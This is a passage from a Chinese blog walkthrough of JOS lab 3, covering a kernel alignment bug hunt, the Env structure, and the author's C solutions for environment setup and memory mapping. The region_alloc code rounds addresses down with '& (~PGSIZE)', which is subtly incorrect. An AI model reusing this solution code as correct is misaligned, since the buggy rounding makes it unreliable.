PGSIZE);<br>&#125;<br></code></pre></td></tr></table></figure><p>**但经过笔者反编译内核文件、打印 end 变量信息发现，其并不指向 bss 的末尾，后面还有几个变量，且其刚好落在内存页对齐的地址…**这也是为什么 ROUNDUP 不能顺利拯救 nextfree 的原因，可能也是为什么之前没有出现该问题的原因：之前 end 不一定刚好落在内存页对齐的地址，向上对齐一个页自然就早已超出 bss 了，但是现在链接器恰好将其生成在了一个微妙的位置</p><p><img src="https://s2.loli.net/2022/03/16/FzLf8Z39beEkXrH.png" alt="image.png"></p><p><img src="https://s2.loli.net/2022/03/16/1YAmcNrF8h3iLTy.png" alt="image.png"></p><p>笔者甚至怀疑 end 可能之前甚至都不在 bss 段末尾，可能也不是链接器生成的“末尾变量”…但是一看 IDA 的反编译结果，<strong>好像确乎有个 end 在整个镜像的最末尾，但他又指回了那个位置尴尬的 end 变量</strong></p><p><img src="https://s2.loli.net/2022/03/16/qDMFGo9v83PAOpY.png" alt="image.png"></p><p>笔者暂且不知道是什么原因导致了这个现象的发生，目前的解决方案是在计算 nextfree 时多加一个 page 进行 ROUNDUP，<strong>但在后面的 check_kern_pgdir 里面又 panic 掉了…</strong></p><blockquote><p>lab2 跑得好好的 lab3 咋突然莫名其妙炸了，👴不理解</p></blockquote><p>于是笔者<strong>将 lab2 分支的 kern&#x2F;pmap.c 拷贝过来，让 end 加上一个 page，内存管理这一块又一切正常了…</strong></p><blockquote><p>👴愿意称之为灵异事件</p></blockquote><p>那就只能是 lab3 中的一些改动把内存管理给 crash 掉了，笔者检索该函数的 panic 信息，发现确乎是在检查 lab3 新增的内存映射区域时 panic 的（这块内存我们还没映射）</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// check envs array (new test for lab 3)</span><br>n = ROUNDUP(NENV*<span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> Env), PGSIZE);<br><span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; n; i += PGSIZE)<br>assert(check_va2pa(pgdir, UENVS + i) == PADDR(envs) + i);<br></code></pre></td></tr></table></figure><p>所以接下来重新开始 lab3 的旅程</p><blockquote><p>但👴觉得 end 确乎是对齐错了</p></blockquote></blockquote><p>在 lab3 中新增了以下文件：</p><table><thead><tr><th><code>inc/</code></th><th><code>env.h</code></th><th>Public definitions for user-mode environments</th></tr></thead><tbody><tr><td></td><td><code>trap.h</code></td><td>Public definitions for trap handling</td></tr><tr><td></td><td><code>syscall.h</code></td><td>Public definitions for system calls from user environments to the kernel</td></tr><tr><td></td><td><code>lib.h</code></td><td>Public definitions for the user-mode support library</td></tr><tr><td><code>kern/</code></td><td><code>env.h</code></td><td>Kernel-private definitions for user-mode environments</td></tr><tr><td></td><td><code>env.c</code></td><td>Kernel code implementing user-mode environments</td></tr><tr><td></td><td><code>trap.h</code></td><td>Kernel-private trap handling definitions</td></tr><tr><td></td><td><code>trap.c</code></td><td>Trap handling code</td></tr><tr><td></td><td><code>trapentry.S</code></td><td>Assembly-language trap handler entry-points</td></tr><tr><td></td><td><code>syscall.h</code></td><td>Kernel-private definitions for system call handling</td></tr><tr><td></td><td><code>syscall.c</code></td><td>System call implementation code</td></tr><tr><td><code>lib/</code></td><td><code>Makefrag</code></td><td>Makefile fragment to build user-mode library, <code>obj/lib/libjos.a</code></td></tr><tr><td></td><td><code>entry.S</code></td><td>Assembly-language entry-point for user environments</td></tr><tr><td></td><td><code>libmain.c</code></td><td>User-mode library setup code called from <code>entry.S</code></td></tr><tr><td></td><td><code>syscall.c</code></td><td>User-mode system call stub functions</td></tr><tr><td></td><td><code>console.c</code></td><td>User-mode implementations of <code>putchar</code> and <code>getchar</code>, providing console I&#x2F;O</td></tr><tr><td></td><td><code>exit.c</code></td><td>User-mode implementation of <code>exit</code></td></tr><tr><td></td><td><code>panic.c</code></td><td>User-mode implementation of <code>panic</code></td></tr><tr><td><code>user/</code></td><td><code>*</code></td><td>Various test programs to check kernel lab 3 code</td></tr></tbody></table><h2 id="Part-A-User-Environments-and-Exception-Handling"><a href="#Part-A-User-Environments-and-Exception-Handling" class="headerlink" title="Part A: User Environments and Exception Handling"></a>Part A: User Environments and Exception Handling</h2><p>在新加入的头文件 <code>inc/env.h</code> 中包含了 JOS 的基本的用户环境定义，内核使用结构体 <code>Env</code> 来标识每一个用户环境，在本 lab 中我们需要完成 JOS 的多环境支持</p><p>在 <code>kern/env.c</code> 中，内核维护三个与环境有关的全局变量：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Env</span> *<span class="hljs-title">envs</span> =</span> <span class="hljs-literal">NULL</span>;<span class="hljs-comment">// All environments</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Env</span> *<span class="hljs-title">curenv</span> =</span> <span class="hljs-literal">NULL</span>;<span class="hljs-comment">// The current env</span><br><span class="hljs-type">static</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Env</span> *<span class="hljs-title">env_free_list</span>;</span><span class="hljs-comment">// Free environment list</span><br></code></pre></td></tr></table></figure><p>在 JOS 启动时会初始化一个长度为 <code>NENV</code> 的 <code>Env</code> 结构体数组，其中闲置的 Env 结构体链在 <code>env_free_list</code> 中，而 <code>curenv</code> 指向当前环境的 Env 结构体（类似于 Linux 内核中的 current() 指向 当前 CPU 上运行的进程的 task_struct），在启动阶段 curenv 为 NULL</p><blockquote><p>笔者认为还是叫进程好听，既然是同一个东西，没有必要为了和 UNIX 区分开来而特意改个莫名其妙的名字</p></blockquote><h3 id="Environment-State"><a href="#Environment-State" class="headerlink" title="Environment State"></a>Environment State</h3><p><code>Env</code> 结构体定义如下，笔者认为可以类比做 Linux 下的 <code>task_struct</code> ：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Env</span> &#123;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Trapframe</span> <span class="hljs-title">env_tf</span>;</span><span class="hljs-comment">// Saved registers</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Env</span> *<span class="hljs-title">env_link</span>;</span><span class="hljs-comment">// Next free Env</span><br><span class="hljs-type">envid_t</span> env_id;<span class="hljs-comment">// Unique environment identifier</span><br><span class="hljs-type">envid_t</span> env_parent_id;<span class="hljs-comment">// env_id of this env&#x27;s parent</span><br><span class="hljs-class"><span class="hljs-keyword">enum</span> <span class="hljs-title">EnvType</span> <span class="hljs-title">env_type</span>;</span><span class="hljs-comment">// Indicates special system environments</span><br><span class="hljs-type">unsigned</span> env_status;<span class="hljs-comment">// Status of the environment</span><br><span class="hljs-type">uint32_t</span> env_runs;<span class="hljs-comment">// Number of times environment has run</span><br><br><span class="hljs-comment">// Address space</span><br><span class="hljs-type">pde_t</span> *env_pgdir;<span class="hljs-comment">// Kernel virtual address of page dir</span><br>&#125;;<br></code></pre></td></tr></table></figure><p>各字段说明如下：</p><ul><li><p><strong>env_tf</strong>: 进程上下文中的寄存器状态</p></li><li><p><strong>env_link</strong>: 在 <code>env_free_list</code> 链表中指向下一个空闲 Env 结构体</p></li><li><p><strong>env_id</strong>: 唯一标识单个进程的 id，在 Env 结构体被重新分配后通常会发生改变</p></li><li><p><strong>env_parent_id</strong>: 父进程的 id</p></li><li><p><strong>env_type</strong>: 进程类型，对于大部分进程而言应当为 <code>ENV_TYPE_USER</code> 在后续的 lab 中会补充更多的为系统服务而出现的类型</p></li></ul><blockquote><p>用户进程与内核进程的既视感</p></blockquote><ul><li><p><strong>env_status</strong>: 进程状态，可选值范围如下：</p><ul><li><p><code>ENV_FREE</code>: 该 Env 结构体空闲</p></li><li><p><code>ENV_RUNNABLE</code>: 该 Env 结构体对应着一个等待运行的进程</p></li><li><p><code>ENV_RUNNING</code>: 该 Env 结构体对应着一个正在运行的进程</p></li><li><p><code>ENV_NOT_RUNNABLE</code>: 该 Env 结构体对应进程未准备好继续运行（例如在等待另一个进程的信号）</p></li><li><p><code>ENV_DYING</code>: 该 Env 结构体对应一个僵尸进程，我们将在 lab4 中用到它</p></li></ul></li><li><p><strong>env_pgdir</strong>: 进程页目录表</p></li></ul><p>需要注意的是，JOS 中的进程并没有自己的内核栈，同一时刻内只有一个进程可以处在内核态，所以 JOS 只需要一个单独的内核栈</p><h3 id="Allocating-the-Environments-Array"><a href="#Allocating-the-Environments-Array" class="headerlink" title="Allocating the Environments Array"></a>Allocating the Environments Array</h3><p>首先是一个小练习，在 <code>mem_init()</code> 中为 envs 数组分配空间</p><blockquote><p><strong>Exercise 1.</strong> Modify <code>mem_init()</code> in <code>kern/pmap.c</code> to allocate and map the <code>envs</code> array. This array consists of exactly <code>NENV</code> instances of the <code>Env</code> structure allocated much like how you allocated the <code>pages</code> array. Also like the <code>pages</code> array, the memory backing <code>envs</code> should also be mapped user read-only at <code>UENVS</code> (defined in <code>inc/memlayout.h</code>) so user processes can read from this array.</p><p>You should run your code and make sure <code>check_kern_pgdir()</code> succeeds.</p></blockquote><p>注意应在 <code>page_init()</code> 之前调用 <code>boot_alloc()</code> 分配空间，在这之后再进行映射，不要图省事写到一起</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//////////////////////////////////////////////////////////////////////</span><br><span class="hljs-comment">// Make &#x27;envs&#x27; point to an array of size &#x27;NENV&#x27; of &#x27;struct Env&#x27;.</span><br><span class="hljs-comment">// LAB 3: Your code here.</span><br>envs = boot_alloc(<span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> Env) * NENV);<br><span class="hljs-built_in">memset</span>(envs, <span class="hljs-number">0</span>, <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> Env) * NENV);<br><br><span class="hljs-comment">//...</span><br><br><span class="hljs-comment">//////////////////////////////////////////////////////////////////////</span><br><span class="hljs-comment">// Map the &#x27;envs&#x27; array read-only by the user at linear address UENVS</span><br><span class="hljs-comment">// (ie. perm = PTE_U | PTE_P).</span><br><span class="hljs-comment">// Permissions:</span><br><span class="hljs-comment">//    - the new image at UENVS  -- kernel R, user R</span><br><span class="hljs-comment">//    - envs itself -- kernel RW, user NONE</span><br><span class="hljs-comment">// LAB 3: Your code here.</span><br>boot_map_region(kern_pgdir, UENVS, <br>ROUNDUP(<span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> Env) * NENV, PGSIZE), <br>PADDR(envs), PTE_U);<br></code></pre></td></tr></table></figure><h3 id="Creating-and-Running-Environments"><a href="#Creating-and-Running-Environments" class="headerlink" title="Creating and Running Environments"></a>Creating and Running Environments</h3><p>我们将在 <code>kern/env.c</code> 中编写运行用户环境所需的代码，因为目前还没有文件系统，所以目前临时的一个做法是将一个 ELF 文件以 raw 格式（链接内核时使用 <code>-b binary</code> 选项）嵌入到内核镜像中，这也是为什么我们能在内核符号文件 <code>obj/kern/kernel.sym</code> 中见到一些奇怪符号的缘故，这也是为什么实验一开始笔者反编译内核镜像见到奇怪的符号的缘故</p><p><img src="https://s2.loli.net/2022/03/16/w3GDsF2iCI1BVkd.png" alt="image.png"></p><p>在 <code>kern/init.c</code> 中的 <code>i386_init()</code> 中我们可以看到启动用户进程的代码，然而设置用户进程的代码尚未完工，这也是我们接下来需要完成的——Exercise2：</p><blockquote><p><strong>Exercise 2.</strong> In the file <code>env.c</code>, finish coding the following functions:</p><ul><li><p><code>env_init()</code></p><p>Initialize all of the <code>Env</code> structures in the <code>envs</code> array and add them to the <code>env_free_list</code>. Also calls <code>env_init_percpu</code>, which configures the segmentation hardware with separate segments for privilege level 0 (kernel) and privilege level 3 (user).</p></li><li><p><code>env_setup_vm()</code></p><p>Allocate a page directory for a new environment and initialize the kernel portion of the new environment’s address space.</p></li><li><p><code>region_alloc()</code></p><p>Allocates and maps physical memory for an environment</p></li><li><p><code>load_icode()</code></p><p>You will need to parse an ELF binary image, much like the boot loader already does, and load its contents into the user address space of a new environment.</p></li><li><p><code>env_create()</code></p><p>Allocate an environment with <code>env_alloc</code> and call <code>load_icode</code> to load an ELF binary into it.</p></li><li><p><code>env_run()</code></p><p>Start a given environment running in user mode.</p></li></ul><p>As you write these functions, you might find the new cprintf verb <code>%e</code> useful – it prints a description corresponding to an error code. For example,</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">r</span> = <span class="hljs-literal">-E_NO_MEM</span>;<br>panic(<span class="hljs-string">&quot;env_alloc: %e&quot;</span>, <span class="hljs-built_in">r</span>);<br></code></pre></td></tr></table></figure><p>will panic with the message “env_alloc: out of memory”.</p></blockquote><p>在开始之前，我们先看实验说明提供给我们的一个内核运行链：</p><ul><li><code>start</code> (<code>kern/entry.S</code>)</li><li><code>i386_init</code> (<code>kern/init.c</code>)<ul><li><code>cons_init</code></li><li><code>mem_init</code></li><li><code>env_init</code></li><li><code>trap_init</code> (still incomplete at this point)</li><li><code>env_create</code></li><li><code>env_run</code><ul><li><code>env_pop_tf</code></li></ul></li></ul></li></ul><p>现在开始补全实验代码。</p><h4 id="env-init-：初始化-Env-结构体，建立-freelist"><a href="#env-init-：初始化-Env-结构体，建立-freelist" class="headerlink" title="env_init()：初始化 Env 结构体，建立 freelist"></a>env_init()：初始化 Env 结构体，建立 freelist</h4><p>首先看 <code>env_init()</code> 函数的注释，主要是将 envs 数组中所有 Env 结构体链到 <code>env_free_list</code> 上，并确保与数组相同的从前向后的连接顺序</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// Mark all environments in &#x27;envs&#x27; as free, set their env_ids to 0,</span><br><span class="hljs-comment">// and insert them into the env_free_list.</span><br><span class="hljs-comment">// Make sure the environments are in the free list in the same order</span><br><span class="hljs-comment">// they are in the envs array (i.e., so that the first call to</span><br><span class="hljs-comment">// env_alloc() returns envs[0]).</span><br><span class="hljs-comment">//</span><br></code></pre></td></tr></table></figure><p>后向遍历 envs 数组建立单向链表即可</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span><br><span class="hljs-title function_">env_init</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br><span class="hljs-comment">// Set up envs array</span><br><span class="hljs-comment">// LAB 3: Your code here.</span><br><span class="hljs-type">int</span> i;<br><br>env_free_list = <span class="hljs-literal">NULL</span>;<br><span class="hljs-keyword">for</span> (i = NENV - <span class="hljs-number">1</span>; i &gt;= <span class="hljs-number">0</span>; i--)<br>&#123;<br>envs[i].env_id = <span class="hljs-number">0</span>;<br>envs[i].env_status = ENV_FREE;<br>envs[i].env_link = env_free_list;<br>env_free_list = &amp;envs[i];<br>&#125;<br><br><span class="hljs-comment">// Per-CPU part of the initialization</span><br>env_init_percpu();<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="env-setup-vm-：分配进程环境资源"><a href="#env-setup-vm-：分配进程环境资源" class="headerlink" title="env_setup_vm()：分配进程环境资源"></a>env_setup_vm()：分配进程环境资源</h4><p>惯例先看注释，主要是让我们分配用户进程所需资源：就目前而言只是分配一个页目录表，并建立对应的内核入口点的映射</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//</span><br><span class="hljs-comment">// Initialize the kernel virtual memory layout for environment e.</span><br><span class="hljs-comment">// Allocate a page directory, set e-&gt;env_pgdir accordingly,</span><br><span class="hljs-comment">// and initialize the kernel portion of the new environment&#x27;s address space.</span><br><span class="hljs-comment">// Do NOT (yet) map anything into the user portion</span><br><span class="hljs-comment">// of the environment&#x27;s virtual address space.</span><br><span class="hljs-comment">//</span><br><span class="hljs-comment">// Returns 0 on success, &lt; 0 on error.  Errors include:</span><br><span class="hljs-comment">//-E_NO_MEM if page directory or table could not be allocated.</span><br><span class="hljs-comment">//</span><br></code></pre></td></tr></table></figure><p>所有的进程共享同一份内核空间（<code>UTOP</code> 往上的虚拟空间），除了<code>UVPT</code>——每个进程各自应当有一份独立的页目录表，因此在该函数中我们需要初始化单个进程的页表对内核空间的映射，参照 <code>inc/memlayout.h</code> 中的布局</p><p>在 JOS 中其实是类似于普通 OS 以前的做法：每个进程共享一份完整的内核地址空间的映射，但笔者认为其实我们只需要映射只读的 pages 数组与 envs 数组即可，<strong>内核的其他区域用户是没有任何访问权限的，那其实没必要建立映射</strong>，笔者认为比较理想的一个状态是类似 KPTI 那样的——用户态与内核态各自有一张页表，其中内核态页表完整映射内核空间，用户态页表仅映射内核入口点，同时两张页表都完整映射用户空间</p><p>这并非不能实现，但是<strong>这或许需要对 JOS 源码进行相当大的改动，且该函数除了创建用户进程以外还承担了创建内核进程的任务，而后者是需要对内核空间有访问权限的</strong>，且 KPTI 确乎会带来一定的开销（但是可以防止熔断与幽灵漏洞的攻击，可能作为一个安全研究员第一想到的并不是性能而是安全性），因此这里笔者还是选择老老实实地完整拷贝一份内核页表</p><blockquote><p>这里别忘了 page_alloc() 分配的是 page 结构体的地址，我们还需要手动转为虚拟地址</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">int</span><br><span class="hljs-title function_">env_setup_vm</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> Env *e)</span><br>&#123;<br><span class="hljs-type">int</span> i;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">PageInfo</span> *<span class="hljs-title">p</span> =</span> <span class="hljs-literal">NULL</span>;<br><br><span class="hljs-comment">// Allocate a page for the page directory</span><br><span class="hljs-keyword">if</span> (!(p = page_alloc(ALLOC_ZERO)))<br><span class="hljs-keyword">return</span> -E_NO_MEM;<br><br><span class="hljs-comment">// Now, set e-&gt;env_pgdir and initialize the page directory.</span><br><span class="hljs-comment">//</span><br><span class="hljs-comment">// Hint:</span><br><span class="hljs-comment">//    - The VA space of all envs is identical above UTOP</span><br><span class="hljs-comment">//(except at UVPT, which we&#x27;ve set below).</span><br><span class="hljs-comment">//See inc/memlayout.h for permissions and layout.</span><br><span class="hljs-comment">//Can you use kern_pgdir as a template?  Hint: Yes.</span><br><span class="hljs-comment">//(Make sure you got the permissions right in Lab 2.)</span><br><span class="hljs-comment">//    - The initial VA below UTOP is empty.</span><br><span class="hljs-comment">//    - You do not need to make any more calls to page_alloc.</span><br><span class="hljs-comment">//    - Note: In general, pp_ref is not maintained for</span><br><span class="hljs-comment">//physical pages mapped only above UTOP, but env_pgdir</span><br><span class="hljs-comment">//is an exception -- you need to increment env_pgdir&#x27;s</span><br><span class="hljs-comment">//pp_ref for env_free to work correctly.</span><br><span class="hljs-comment">//    - The functions in kern/pmap.h are handy.</span><br><br><span class="hljs-comment">// LAB 3: Your code here.</span><br>p-&gt;pp_ref++;<br><br><span class="hljs-comment">// copy kernel pgdir</span><br><span class="hljs-built_in">memcpy</span>(page2kva(p), kern_pgdir, PGSIZE);<br><br>e-&gt;env_pgdir = page2kva(p);<br><br><span class="hljs-comment">// UVPT maps the env&#x27;s own page table read-only.</span><br><span class="hljs-comment">// Permissions: kernel R, user R</span><br>e-&gt;env_pgdir[PDX(UVPT)] = PADDR(e-&gt;env_pgdir) | PTE_P | PTE_U;<br><br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><blockquote><p>而且仔细想来，KPTI并非是基于安全性的改进，<strong>而是对漏洞不得不做出的妥协</strong>，况且这也就只是做个实验而已，暂时还是不大张旗鼓地改了</p></blockquote><h4 id="region-alloc-：为进程分配物理页面，建立映射"><a href="#region-alloc-：为进程分配物理页面，建立映射" class="headerlink" title="region_alloc()：为进程分配物理页面，建立映射"></a>region_alloc()：为进程分配物理页面，建立映射</h4><p>主要是为用户进程的 va 起始处 len 长度的虚拟地址空间分配物理页面，别忘了大小按页面粒度对齐以及页表项用户可写权限</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//</span><br><span class="hljs-comment">// Allocate len bytes of physical memory for environment env,</span><br><span class="hljs-comment">// and map it at virtual address va in the environment&#x27;s address space.</span><br><span class="hljs-comment">// Does not zero or otherwise initialize the mapped pages in any way.</span><br><span class="hljs-comment">// Pages should be writable by user and kernel.</span><br><span class="hljs-comment">// Panic if any allocation attempt fails.</span><br><span class="hljs-comment">//</span><br><span class="hljs-type">static</span> <span class="hljs-type">void</span><br><span class="hljs-title function_">region_alloc</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> Env *e, <span class="hljs-type">void</span> *va, <span class="hljs-type">size_t</span> len)</span><br>&#123;<br><span class="hljs-comment">// LAB 3: Your code here.</span><br><span class="hljs-comment">// (But only if you need it for load_icode.)</span><br><span class="hljs-comment">//</span><br><span class="hljs-comment">// Hint: It is easier to use region_alloc if the caller can pass</span><br><span class="hljs-comment">//   &#x27;va&#x27; and &#x27;len&#x27; values that are not page-aligned.</span><br><span class="hljs-comment">//   You should round va down, and round (va + len) up.</span><br><span class="hljs-comment">//   (Watch out for corner-cases!)</span><br><span class="hljs-type">size_t</span> start, end;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">PageInfo</span> *<span class="hljs-title">new_p</span>;</span><br><br>start = ((<span class="hljs-type">size_t</span>)va) &amp; (~PGSIZE);<br>end = ROUNDUP((<span class="hljs-type">size_t</span>)va + len, PGSIZE);<br><br><span class="hljs-keyword">for</span> (; start &lt; end; start += PGSIZE)<br>&#123;<br>new_p = page_alloc(<span class="hljs-number">0</span>);<br><span class="hljs-keyword">if</span> (!new_p)<br>panic(<span class="hljs-string">&quot;Out of memory while allocating region for env!&quot;</span>);<br>new_p-&gt;pp_ref++;<br><span class="hljs-keyword">if</span>(page_insert(e-&gt;env_pgdir, new_p, (<span class="hljs-type">void</span>*)start, PTE_U | PTE_W))<br>panic(<span class="hljs-string">&quot;OOM while inserting page into page table!&quot;</span>);<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="load-icode-：解析-ELF-文件，作为新进程载入"><a href="#load-icode-：解析-ELF-文件，作为新进程载入" class="headerlink" title="load_icode()：解析 ELF 文件，作为新进程载入"></a>load_icode()：解析 ELF 文件，作为新进程载入</h4><p>先看注释，让我们手写一个 ELF 解析器，为各个存在于 ELF 中的段分配空间（例如 bss 段在 ELF 中就不占空间）</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//</span><br><span class="hljs-comment">// Set up the initial program binary, stack, and processor flags</span><br><span class="hljs-comment">// for a user process.</span><br><span class="hljs-comment">// This function is ONLY called during kernel initialization,</span><br><span class="hljs-comment">// before running the first user-mode environment.</span><br><span class="hljs-comment">//</span><br><span class="hljs-comment">// This function loads all loadable segments from the ELF binary image</span><br><span class="hljs-comment">// into the environment&#x27;s user memory, starting at the appropriate</span><br><span class="hljs-comment">// virtual addresses indicated in the ELF program header.</span><br><span class="hljs-comment">// At the same time it clears to zero any portions of these segments</span><br><span class="hljs-comment">// that are marked in the program header as being mapped</span><br><span class="hljs-comment">// but not actually present in the ELF file - i.e., the program&#x27;s bss section.</span><br><span class="hljs-comment">//</span><br><span class="hljs-comment">// All this is very similar to what our boot loader does, except the boot</span><br><span class="hljs-comment">// loader also needs to read the code from disk.  Take a look at</span><br><span class="hljs-comment">// boot/main.c to get ideas.</span><br><span class="hljs-comment">//</span><br><span class="hljs-comment">// Finally, this function maps one page for the program&#x27;s initial stack.</span><br><span class="hljs-comment">//</span><br><span class="hljs-comment">// load_icode panics if it encounters problems.</span><br><span class="hljs-comment">//  - How might load_icode fail?  What might be wrong with the given input?</span><br><span class="hljs-comment">//</span><br></code></pre></td></tr></table></figure><p>主要还是苦力活，解析 ELF header，选出可载入段（<code>ph-&gt;p_type == ELF_PROG_LOAD</code>），分配内存，在页表中建立映射，不过这里提示我们可以抄一抄 <code>boot/main.c</code> 中的解析方法（<del>那👴当然要抄🌶</del>）</p><blockquote><p> 关于 ELF 格式网上大把资料，不会的可以参见 <a href="https://arttnba3.cn/2021/06/24/CODE-0X00-A3OS/#%E4%B8%83%E3%80%81%E5%8F%AF%E6%89%A7%E8%A1%8C-ELF-%E6%96%87%E4%BB%B6%E6%A0%BC%E5%BC%8F%E6%B5%85%E6%9E%90">https://arttnba3.cn/2021/06/24/CODE-0X00-A3OS/#%E4%B8%83%E3%80%81%E5%8F%AF%E6%89%A7%E8%A1%8C-ELF-%E6%96%87%E4%BB%B6%E6%A0%BC%E5%BC%8F%E6%B5%85%E6%9E%90</a></p></blockquote><p>这里我们需要注意的是，由于我们仅需要在用户空间建立映射，而我们在分配完空间之后还需要将数据拷贝上去，考虑到用户空间页表中也映射了内核空间，<strong>我们可以先切换到用户页表处理数据，完成之后再切换回内核页表</strong>，在 JOS 中提供了一个 <code>lcr3()</code> 让我们能直接更改 cr3 寄存器的值（该寄存器中存放着页目录表的地址）</p><p>别忘了将 ELF header 中的 entry （<strong>程序入口点</strong>）给到 Env 结构体中寄存器结构体的 eip</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span 